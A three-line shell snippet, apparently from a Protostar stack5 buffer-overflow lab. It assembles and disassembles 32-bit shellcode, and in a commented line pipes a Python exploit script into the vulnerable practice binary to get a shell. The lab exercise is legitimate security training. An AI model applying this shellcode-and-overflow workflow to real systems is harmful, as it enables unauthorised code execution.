gcc -c -m32 shellcode.s -o shellcode.o
objdump --disassemble shellcode.o
# (python stack5.py; cat) | /opt/protostar/bin/stack5